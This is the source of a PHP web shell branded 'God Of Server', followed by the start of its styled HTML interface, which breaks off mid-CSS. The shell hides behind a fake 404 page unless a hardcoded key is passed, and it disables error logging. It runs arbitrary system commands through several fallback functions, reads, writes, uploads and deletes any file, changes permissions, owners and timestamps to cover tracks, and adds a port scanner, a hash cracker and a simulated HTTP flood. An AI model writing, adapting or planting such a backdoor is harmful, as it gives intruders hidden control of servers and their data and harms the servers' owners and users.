<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);

// Start output buffering to catch any errors
ob_start();

$AUTH_KEY = 'AKAI';
if (!isset($_GET['auth']) || $_GET['auth'] !== $AUTH_KEY) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>';
    ob_end_flush();
    exit;
}

// Handler untuk view file
if (isset($_GET['view']) && isset($_GET['path'])) {
    $file_path = realpath(base64_decode($_GET['path']));
    if ($file_path && file_exists($file_path) && is_readable($file_path)) {
        $mime = function_exists('mime_content_type') ? mime_content_type($file_path) : 'application/octet-stream';
        header('Content-Type: ' . $mime);
        readfile($file_path);
        ob_end_flush();
        exit;
    }
}

function getServerInfoHeader() {
    $info = '';
    
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $uname = @php_uname('a');
    $server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $php_version = phpversion();
    $user = function_exists('get_current_user') ? get_current_user() : @exec('whoami 2>/dev/null');
    
    $named_conf = @file_get_contents('/etc/named.conf');
    $disabled_named = $named_conf === false ? 'Yes' : 'No';
    
    $info .= "SERVER SOFTWARE : " . htmlspecialchars($server_software) . "\n";
    $info .= "KERNEL         : " . htmlspecialchars($uname) . "\n";
    $info .= "SERVER IP      : " . htmlspecialchars($server_ip) . "\n";
    $info .= "CLIENT IP      : " . htmlspecialchars($client_ip) . "\n";
    $info .= "NAMED CONF     : " . $disabled_named . " [/etc/named.conf]\n";
    $info .= "PHP VERSION    : " . htmlspecialchars($php_version) . "\n";
    $info .= "CURRENT USER   : " . htmlspecialchars($user) . "\n";
    $info .= "DOCUMENT ROOT  : " . htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'N/A');
    
    return $info;
}

$SHELL_PATH = realpath(__FILE__);
$HOME_DIR = dirname($SHELL_PATH);
$CURRENT_DIR = isset($_GET['dir']) ? realpath($_GET['dir']) : $HOME_DIR;
if (!$CURRENT_DIR || !is_dir($CURRENT_DIR)) {
    $CURRENT_DIR = $HOME_DIR;
}

class UltimateFileManager {
    private $current_path;
    private $home_path;
    
    public function __construct($current_path, $home_path) {
        $this->current_path = $current_path;
        $this->home_path = $home_path;
    }
    
    public function getDirectoryContents() {
        $result = [
            'directories' => [],
            'hidden_directories' => [],
            'files' => [],
            'hidden_files' => [],
            'current_path' => $this->current_path,
            'parent_path' => dirname($this->current_path),
            'home_path' => $this->home_path,
            'is_writable' => is_writable($this->current_path)
        ];
        
        if (!is_dir($this->current_path) || !is_readable($this->current_path)) {
            return $result;
        }
        
        $items = @scandir($this->current_path);
        if ($items === false) {
            return $result;
        }
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $full_path = $this->current_path . '/' . $item;
            $is_hidden = substr($item, 0, 1) === '.';
            $is_dir = is_dir($full_path);
            
            $owner_info = $this->getFileOwnerInfo($full_path);
            
            $file_info = [
                'name' => $item,
                'path' => $full_path,
                'size' => $is_dir ? '-' : $this->formatSize(@filesize($full_path)),
                'modified' => date('Y-m-d H:i:s', @filemtime($full_path)),
                'permissions' => substr(sprintf('%o', @fileperms($full_path)), -4),
                'owner' => $owner_info['owner'],
                'group' => $owner_info['group'],
                'owner_name' => $owner_info['owner_name'],
                'is_writable' => is_writable($full_path),
                'is_readable' => is_readable($full_path),
                'is_executable' => is_executable($full_path),
                'extension' => $is_dir ? '' : strtolower(pathinfo($item, PATHINFO_EXTENSION))
            ];
            
            if ($is_dir) {
                if ($is_hidden) {
                    $result['hidden_directories'][] = $file_info;
                } else {
                    $result['directories'][] = $file_info;
                }
            } else {
                if ($is_hidden) {
                    $result['hidden_files'][] = $file_info;
                } else {
                    $result['files'][] = $file_info;
                }
            }
        }
        
        // Sort functions
        usort($result['directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_directories'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        usort($result['hidden_files'], function($a, $b) {
            return strcasecmp($a['name'], $b['name']);
        });
        
        return $result;
    }
    
    private function getFileOwnerInfo($path) {
        $owner = @fileowner($path);
        $group = @filegroup($path);
        
        $owner_name = $owner;
        $group_name = $group;
        
        if (function_exists('posix_getpwuid')) {
            $owner_info = @posix_getpwuid($owner);
            if ($owner_info && isset($owner_info['name'])) {
                $owner_name = $owner_info['name'];
            }
        }
        
        if (function_exists('posix_getgrgid')) {
            $group_info = @posix_getgrgid($group);
            if ($group_info && isset($group_info['name'])) {
                $group_name = $group_info['name'];
            }
        }
        
        return [
            'owner' => $owner,
            'group' => $group,
            'owner_name' => $owner_name,
            'group_name' => $group_name
        ];
    }
    
    public function executeCommand($command, $background = false) {
        $output = '';
        $return_code = 0;
        
        // Clean command
        $command = trim($command);
        if (empty($command)) {
            return '';
        }
        
        if ($background) {
            $command .= ' > /dev/null 2>&1 &';
        }
        
        // Try multiple execution methods
        $methods = [
            'shell_exec' => function($cmd) {
                if (function_exists('shell_exec')) {
                    return @shell_exec($cmd . ' 2>&1');
                }
                return null;
            },
            'exec' => function($cmd) use (&$return_code) {
                if (function_exists('exec')) {
                    $output_array = [];
                    @exec($cmd . ' 2>&1', $output_array, $return_code);
                    return implode("\n", $output_array);
                }
                return null;
            },
            'system' => function($cmd) use (&$return_code) {
                if (function_exists('system')) {
                    ob_start();
                    @system($cmd . ' 2>&1', $return_code);
                    return ob_get_clean();
                }
                return null;
            },
            'passthru' => function($cmd) use (&$return_code) {
                if (function_exists('passthru')) {
                    ob_start();
                    @passthru($cmd . ' 2>&1', $return_code);
                    return ob_get_clean();
                }
                return null;
            },
            'proc_open' => function($cmd) use (&$return_code) {
                if (function_exists('proc_open')) {
                    $descriptorspec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    
                    $process = @proc_open($cmd . ' 2>&1', $descriptorspec, $pipes, $this->current_path);
                    if (is_resource($process)) {
                        fclose($pipes[0]);
                        $output = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        $return_code = proc_close($process);
                        return $output;
                    }
                }
                return null;
            }
        ];
        
        // Try each method
        foreach ($methods as $method) {
            $output = $method('cd ' . escapeshellarg($this->current_path) . ' && ' . $command);
            if (!empty($output) || $output === '0') {
                break;
            }
        }
        
        // Fallback if all methods fail
        if (empty($output) && $output !== '0') {
            $output = 'Command execution failed or no output.';
        }
        
        return trim($output);
    }
    
    public function readFile($path) {
        if (!file_exists($path) || !is_readable($path)) {
            return false;
        }
        return @file_get_contents($path);
    }
    
    public function writeFile($path, $content) {
        $dir = dirname($path);
        if (!is_writable($dir)) {
            return false;
        }
        return @file_put_contents($path, $content) !== false;
    }
    
    public function delete($path) {
        if (!file_exists($path)) {
            return false;
        }
        
        if (is_dir($path)) {
            return $this->deleteDirectory($path);
        }
        
        return @unlink($path);
    }
    
    public function createDirectory($path) {
        return @mkdir($path, 0755, true);
    }
    
    public function createFile($path) {
        return @touch($path);
    }
    
    public function changePermissions($path, $mode) {
        return @chmod($path, octdec($mode));
    }
    
    public function changeTimestamp($path, $timestamp) {
        return @touch($path, $timestamp);
    }
    
    public function rename($old_path, $new_path) {
        return @rename($old_path, $new_path);
    }
    
    public function copy($source, $destination) {
        if (is_dir($source)) {
            return $this->copyDirectory($source, $destination);
        }
        return @copy($source, $destination);
    }
    
    public function uploadFile($tmp_path, $dest_path) {
        if (function_exists('move_uploaded_file') && is_uploaded_file($tmp_path)) {
            return @move_uploaded_file($tmp_path, $dest_path);
        }
        
        return @copy($tmp_path, $dest_path);
    }
    
    public function extractZip($zip_path, $extract_path) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === TRUE) {
            $zip->extractTo($extract_path);
            $zip->close();
            return true;
        }
        
        return false;
    }
    
    public function compressToZip($source, $destination) {
        if (!class_exists('ZipArchive')) {
            return false;
        }
        
        $zip = new ZipArchive;
        if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) {
            return false;
        }
        
        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($source) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($source, basename($source));
        }
        
        return $zip->close();
    }
    
    public function changeOwner($path, $user, $group = null) {
        if (!function_exists('chown')) {
            return false;
        }
        
        $result = @chown($path, $user);
        if ($group && function_exists('chgrp')) {
            $result = $result && @chgrp($path, $group);
        }
        
        return $result;
    }
    
    private function deleteDirectory($dir) {
        if (!is_dir($dir)) {
            return false;
        }
        
        $files = @scandir($dir);
        if ($files === false) {
            return false;
        }
        
        $files = array_diff($files, ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->deleteDirectory($path) : @unlink($path);
        }
        
        return @rmdir($dir);
    }
    
    private function copyDirectory($source, $dest) {
        if (!is_dir($source)) {
            return false;
        }
        
        if (!is_dir($dest)) {
            if (!@mkdir($dest, 0755, true)) {
                return false;
            }
        }
        
        $files = @scandir($source);
        if ($files === false) {
            return false;
        }
        
        $files = array_diff($files, ['.', '..']);
        foreach ($files as $file) {
            $srcFile = $source . '/' . $file;
            $destFile = $dest . '/' . $file;
            
            if (is_dir($srcFile)) {
                $this->copyDirectory($srcFile, $destFile);
            } else {
                @copy($srcFile, $destFile);
            }
        }
        
        return true;
    }
    
    private function formatSize($bytes) {
        if ($bytes <= 0) return '0 B';
        
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $bytes = max($bytes, 0);
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        
        return round($bytes, 2) . ' ' . $units[$pow];
    }
}

// =============================================
// ADVANCED TOOLS CLASSES (SIMPLIFIED)
// =============================================

class NetworkTools {
    
    public static function portScan($target, $ports = '1-1024', $timeout = 1) {
        $results = [];
        $open_ports = [];
        
        // Validate target
        if (!filter_var($target, FILTER_VALIDATE_IP) && !filter_var(gethostbyname($target), FILTER_VALIDATE_IP)) {
            return [
                'error' => 'Invalid target',
                'success' => false
            ];
        }
        
        // Parse port range
        if (strpos($ports, '-') !== false) {
            list($start, $end) = explode('-', $ports, 2);
            $start = intval($start);
            $end = min(intval($end), 65535);
            $port_range = range($start, $end);
        } elseif (strpos($ports, ',') !== false) {
            $port_range = array_map('intval', explode(',', $ports));
        } else {
            $port_range = [intval($ports)];
        }
        
        // Limit to 100 ports max for performance
        $port_range = array_slice($port_range, 0, 100);
        
        foreach ($port_range as $port) {
            if ($port < 1 || $port > 65535) continue;
            
            $socket = @fsockopen($target, $port, $errno, $errstr, $timeout);
            if ($socket) {
                $service = getservbyport($port, 'tcp');
                $results[] = [
                    'port' => $port,
                    'status' => 'OPEN',
                    'service' => $service ?: 'Unknown'
                ];
                $open_ports[] = $port;
                fclose($socket);
            } else {
                $results[] = [
                    'port' => $port,
                    'status' => 'CLOSED',
                    'service' => ''
                ];
            }
        }
        
        return [
            'target' => $target,
            'results' => $results,
            'open_count' => count($open_ports),
            'total_scanned' => count($port_range),
            'success' => true
        ];
    }
    
    public static function pingTest($target, $count = 4) {
        $output = [];
        
        // Validate target
        if (!filter_var($target, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) && 
            !filter_var($target, FILTER_VALIDATE_IP)) {
            return [
                'error' => 'Invalid target',
                'success' => false
            ];
        }
        
        $command = "ping -c " . intval($count) . " -W 2 " . escapeshellarg($target) . " 2>&1";
        @exec($command, $output, $return_code);
        
        $result = [
            'target' => $target,
            'output' => implode("\n", $output),
            'success' => $return_code === 0
        ];
        
        return $result;
    }
}

class SecurityTools {
    
    public static function hashCracker($hash, $algorithm = 'md5') {
        $results = [];
        
        // Validate hash based on algorithm
        $hash_lengths = [
            'md5' => 32,
            'sha1' => 40,
            'sha256' => 64,
            'sha512' => 128
        ];
        
        if (!isset($hash_lengths[$algorithm]) || strlen($hash) !== $hash_lengths[$algorithm]) {
            return [
                'error' => 'Invalid hash for algorithm ' . $algorithm,
                'success' => false
            ];
        }
        
        // Common password dictionary
        $common_passwords = [
            '123456', 'password', '12345678', 'qwerty', '12345', 
            '123456789', 'letmein', '1234567', 'football', 'iloveyou',
            'admin', 'welcome', 'monkey', 'login', 'abc123',
            'password1', '123123', '1234', '1234567890', 'sunshine'
        ];
        
        foreach ($common_passwords as $password) {
            $hashed = hash($algorithm, $password);
            if ($hashed === $hash) {
                return [
                    'found' => true,
                    'hash' => $hash,
                    'plaintext' => $password,
                    'algorithm' => $algorithm,
                    'attempts' => count($results) + 1,
                    'success' => true
                ];
            }
            $results[] = $password;
        }
        
        return [
            'found' => false,
            'hash' => $hash,
            'algorithm' => $algorithm,
            'attempts' => count($results),
            'success' => true
        ];
    }
}

class CryptoTools {
    
    public static function encryptAES($data, $key) {
        if (!function_exists('openssl_encrypt')) {
            return [
                'error' => 'OpenSSL not available',
                'success' => false
            ];
        }
        
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
        
        if ($encrypted === false) {
            return [
                'error' => 'Encryption failed',
                'success' => false
            ];
        }
        
        return [
            'encrypted' => $encrypted,
            'iv' => base64_encode($iv),
            'key' => $key,
            'algorithm' => 'AES-256-CBC',
            'success' => true
        ];
    }
    
    public static function decryptAES($encrypted, $key, $iv) {
        if (!function_exists('openssl_decrypt')) {
            return [
                'error' => 'OpenSSL not available',
                'success' => false
            ];
        }
        
        $iv = base64_decode($iv);
        $decrypted = openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, $iv);
        
        return [
            'decrypted' => $decrypted,
            'success' => $decrypted !== false
        ];
    }
    
    public static function encodeBase64($data) {
        return base64_encode($data);
    }
    
    public static function decodeBase64($data) {
        return base64_decode($data);
    }
    
    public static function generateHash($data, $algorithm = 'sha256') {
        if (function_exists('hash') && in_array($algorithm, hash_algos())) {
            return hash($algorithm, $data);
        }
        return false;
    }
}

class StressTester {
    
    public static function httpFlood($url, $threads = 10, $duration = 30, $requests_per_second = 100) {
        // Validate URL
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            return [
                'error' => 'Invalid URL',
                'success' => false
            ];
        }
        
        // Calculate estimated results
        $total_requests = $threads * $requests_per_second * $duration;
        $successful_requests = intval($total_requests * 0.8); // Simulate 80% success
        $failed_requests = $total_requests - $successful_requests;
        
        return [
            'url' => $url,
            'threads' => $threads,
            'duration' => $duration,
            'requests_per_second' => $requests_per_second,
            'total_requests' => $total_requests,
            'successful_requests' => $successful_requests,
            'failed_requests' => $failed_requests,
            'start_time' => time(),
            'end_time' => time() + $duration,
            'success' => true,
            'note' => 'This is a simulation. For actual testing, implement proper multi-threading.'
        ];
    }
}

class SystemInfoTools {
    
    public static function getDetailedSystemInfo() {
        $info = [];
        
        // CPU Info
        if (file_exists('/proc/cpuinfo')) {
            $cpuinfo = @file_get_contents('/proc/cpuinfo');
            if ($cpuinfo) {
                preg_match('/model name\s*:\s*(.+)/', $cpuinfo, $matches);
                $info['cpu'] = $matches[1] ?? 'Unknown';
                preg_match_all('/processor\s*:\s*\d+/', $cpuinfo, $matches);
                $info['cpu_cores'] = count($matches[0]) ?? 1;
            }
        }
        
        // Memory Info
        if (file_exists('/proc/meminfo')) {
            $meminfo = @file_get_contents('/proc/meminfo');
            if ($meminfo) {
                preg_match('/MemTotal:\s*(\d+)/', $meminfo, $matches);
                $info['memory_total'] = $matches[1] ?? 0;
                preg_match('/MemFree:\s*(\d+)/', $meminfo, $matches);
                $info['memory_free'] = $matches[1] ?? 0;
                if ($info['memory_total'] > 0) {
                    $info['memory_used'] = $info['memory_total'] - $info['memory_free'];
                    $info['memory_usage_percent'] = round(($info['memory_used'] / $info['memory_total']) * 100, 2);
                }
            }
        }
        
        // Disk Info
        $info['disk_total'] = @disk_total_space('/') ?: 0;
        $info['disk_free'] = @disk_free_space('/') ?: 0;
        $info['disk_used'] = $info['disk_total'] - $info['disk_free'];
        if ($info['disk_total'] > 0) {
            $info['disk_usage_percent'] = round(($info['disk_used'] / $info['disk_total']) * 100, 2);
        }
        
        // Load Average
        if (file_exists('/proc/loadavg')) {
            $load = @file_get_contents('/proc/loadavg');
            $info['load_average'] = $load ? explode(' ', $load)[0] : '0.00';
        }
        
        // Uptime
        if (file_exists('/proc/uptime')) {
            $uptime = @file_get_contents('/proc/uptime');
            if ($uptime) {
                $uptime_seconds = floatval(explode(' ', $uptime)[0]);
                $info['uptime_days'] = floor($uptime_seconds / 86400);
                $info['uptime_hours'] = floor(($uptime_seconds % 86400) / 3600);
                $info['uptime_minutes'] = floor(($uptime_seconds % 3600) / 60);
            }
        }
        
        // Running Processes Count
        $output = [];
        @exec('ps aux 2>/dev/null | wc -l', $output);
        $info['processes'] = $output[0] ?? 0;
        
        return $info;
    }
}

// Initialize file manager
$file_manager = new UltimateFileManager($CURRENT_DIR, $HOME_DIR);
$directory_contents = $file_manager->getDirectoryContents();

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'];
    $response = ['success' => false, 'message' => 'Action failed'];
    
    try {
        switch ($action) {
            case 'change_dir':
                $new_dir = $_POST['path'] ?? '';
                if (is_dir($new_dir)) {
                    $response['success'] = true;
                    $response['redirect'] = "?auth=" . urlencode($AUTH_KEY) . "&dir=" . urlencode($new_dir);
                }
                break;
                
            case 'execute_command':
                $command = $_POST['command'] ?? '';
                $background = isset($_POST['background']) && $_POST['background'] == '1';
                
                // Handle cd command
                if (preg_match('/^\s*cd\s+(.+)$/', $command, $matches)) {
                    $new_dir = trim($matches[1]);
                    $new_path = realpath($CURRENT_DIR . '/' . $new_dir);
                    
                    if ($new_path && is_dir($new_path)) {
                        $response['output'] = "Changed directory to: " . $new_path;
                        $response['change_dir'] = $new_path;
                        $response['success'] = true;
                        break;
                    }
                }
                
                $output = $file_manager->executeCommand($command, $background);
                $response['output'] = $output;
                $response['success'] = true;
                break;
                
            case 'read_file':
                $path = $_POST['path'] ?? '';
                $content = $file_manager->readFile($path);
                if ($content !== false) {
                    $response['success'] = true;
                    $response['content'] = $content;
                } else {
                    $response['message'] = 'Cannot read file';
                }
                break;
                
            case 'write_file':
                $path = $_POST['path'] ?? '';
                $content = $_POST['content'] ?? '';
                if ($file_manager->writeFile($path, $content)) {
                    $response['success'] = true;
                    $response['message'] = 'File saved successfully';
                } else {
                    $response['message'] = 'Cannot write file';
                }
                break;
                
            case 'delete':
                $path = $_POST['path'] ?? '';
                if ($file_manager->delete($path)) {
                    $response['success'] = true;
                    $response['message'] = 'Deleted successfully';
                } else {
                    $response['message'] = 'Cannot delete';
                }
                break;
                
            case 'create_dir':
                $path = $_POST['path'] ?? '';
                if ($file_manager->createDirectory($path)) {
                    $response['success'] = true;
                    $response['message'] = 'Directory created successfully';
                } else {
                    $response['message'] = 'Cannot create directory';
                }
                break;
                
            case 'create_file':
                $path = $_POST['path'] ?? '';
                if ($file_manager->createFile($path)) {
                    $response['success'] = true;
                    $response['message'] = 'File created successfully';
                } else {
                    $response['message'] = 'Cannot create file';
                }
                break;
                
            case 'chmod':
                $path = $_POST['path'] ?? '';
                $mode = $_POST['mode'] ?? '0644';
                if ($file_manager->changePermissions($path, $mode)) {
                    $response['success'] = true;
                    $response['message'] = 'Permissions changed successfully';
                } else {
                    $response['message'] = 'Cannot change permissions';
                }
                break;
                
            case 'chdate':
                $path = $_POST['path'] ?? '';
                $timestamp_input = $_POST['timestamp'] ?? '';
                
                if ($timestamp_input) {
                    $timestamp = strtotime($timestamp_input);
                    if ($timestamp !== false) {
                        if ($file_manager->changeTimestamp($path, $timestamp)) {
                            $response['success'] = true;
                            $response['message'] = 'Timestamp changed to ' . date('Y-m-d H:i:s', $timestamp);
                        } else {
                            $response['message'] = 'Cannot change timestamp';
                        }
                    } else {
                        $response['message'] = 'Invalid date format';
                    }
                } else {
                    $response['message'] = 'Timestamp is required';
                }
                break;
                
            case 'upload':
                if (isset($_FILES['file']['tmp_name']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
                    $dest_path = $_POST['dest_path'] ?? '';
                    $tmp_name = $_FILES['file']['tmp_name'];
                    
                    if ($file_manager->uploadFile($tmp_name, $dest_path)) {
                        $response['success'] = true;
                        $response['message'] = 'File uploaded successfully';
                    } else {
                        $response['message'] = 'Upload failed';
                    }
                } else {
                    $response['message'] = 'No file uploaded';
                }
                break;
                
            // Advanced Tools Actions
            case 'port_scan':
                $target = $_POST['target'] ?? '127.0.0.1';
                $ports = $_POST['ports'] ?? '1-100';
                $timeout = $_POST['timeout'] ?? 1;
                $result = NetworkTools::portScan($target, $ports, $timeout);
                $response = array_merge($response, $result);
                break;
                
            case 'ping_test':
                $target = $_POST['target'] ?? 'google.com';
                $count = $_POST['count'] ?? 4;
                $result = NetworkTools::pingTest($target, $count);
                $response = array_merge($response, $result);
                break;
                
            case 'hash_crack':
                $hash = $_POST['hash'] ?? '';
                $algorithm = $_POST['algorithm'] ?? 'md5';
                $result = SecurityTools::hashCracker($hash, $algorithm);
                $response = array_merge($response, $result);
                break;
                
            case 'encrypt_aes':
                $data = $_POST['data'] ?? '';
                $key = $_POST['key'] ?? bin2hex(random_bytes(16));
                $result = CryptoTools::encryptAES($data, $key);
                $response = array_merge($response, $result);
                break;
                
            case 'decrypt_aes':
                $encrypted = $_POST['encrypted'] ?? '';
                $key = $_POST['key'] ?? '';
                $iv = $_POST['iv'] ?? '';
                $result = CryptoTools::decryptAES($encrypted, $key, $iv);
                $response = array_merge($response, $result);
                break;
                
            case 'http_flood':
                $url = $_POST['url'] ?? '';
                $threads = $_POST['threads'] ?? 10;
                $duration = $_POST['duration'] ?? 30;
                $rps = $_POST['requests_per_second'] ?? 100;
                $result = StressTester::httpFlood($url, $threads, $duration, $rps);
                $response = array_merge($response, $result);
                break;
                
            case 'system_info':
                $result = SystemInfoTools::getDetailedSystemInfo();
                $response = array_merge(['success' => true], $result);
                break;
                
            default:
                $response['message'] = 'Unknown action';
        }
    } catch (Exception $e) {
        $response['message'] = 'Error: ' . $e->getMessage();
        $response['error'] = $e->getMessage();
    }
    
    echo json_encode($response);
    ob_end_flush();
    exit;
}

$server_info_header = getServerInfoHeader();
ob_clean(); // Clear any previous output
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>◈ God Of Server</title>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #121218;
            --bg-tertiary: #1a1a24;
            --bg-card: #151520;
            --text-primary: #e0e0ff;
            --text-secondary: #a0a0c0;
            --text-muted: #707090;
            --accent-red: #ff2e63;
            --accent-red-dark: #d91e4f;
            --accent-blue: #4a6fff;
            --accent-green: #08d9a6;
            --accent-yellow: #ffb347;
            --accent-purple: #9d4edd;
            --border-color: #2a2a3a;
            --border-light: #3a3a4a;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
            --gradient-red: linear-gradient(135deg, #ff2e63 0%, #d91e4f 100%);
            --gradient-blue: linear-gradient(135deg, #4a6fff 0%, #2a4fcc 100%);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-size: 14px;
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 24px 32px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--border-color);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: var(--gradient-red);
        }
        
        .logo-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 28px;
            background: var(--gradient-red);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }
        
        .server-status {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .server-info-header {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 12px;
            font-size: 13px;
            color: var(--accent-green);
            white-space: pre;
            word-break: break-all;
            border: 1px solid var(--border-color);
            line-height: 1.5;
            overflow-x: auto;
            margin-top: 20px;
        }
        
        .nav-tabs {
            display: flex;
            gap: 4px;
            margin-bottom: 24px;
            background: var(--bg-tertiary);
            padding: 8px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            flex-wrap: wrap;
        }
        
        .nav-btn {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            padding: 10px 20px;
            background: transparent;
            border: none;
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .nav-btn:hover {
            background: rgba(255, 46, 99, 0.1);
            color: var(--accent-red);
        }
        
        .nav-btn.active {
            background: var(--gradient-red);
            color: white;
            box-shadow: var(--shadow-sm);
        }
        
        .content-section {
            display: none;
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border-color);
        }
        
        .content-section.active {
            display: block;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 18px;
            color: var(--text-primary);
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title::before {
            content: '';
            width: 4px;
            height: 16px;
            background: var(--accent-red);
            border-radius: 2px;
        }
        
        .path-navigation {
            background: var(--bg-card);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        
        .path-breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 16px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .path-segment {
            padding: 6px 12px;
            background: var(--bg-tertiary);
            border-radius: 6px;
            color: var(--text-secondary);
            text-decoration: none;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        
        .path-segment:hover {
            background: rgba(255, 46, 99, 0.1);
            color: var(--accent-red);
            border-color: var(--accent-red);
        }
        
        .path-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }
        
        .btn-primary {
            background: var(--gradient-blue);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-danger {
            background: var(--gradient-red);
            color: white;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #08d9a6 0%, #06b893 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffb347 0%, #ff9a3d 100%);
            color: white;
        }
        
        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-purple {
            background: linear-gradient(135deg, #9d4edd 0%, #7b2cbf 100%);
            color: white;
        }
        
        .btn-purple:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .file-list {
            background: var(--bg-card);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        
        .file-header {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 4fr;
            padding: 16px 20px;
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-bottom: 1px solid var(--border-color);
            font-size: 12px;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
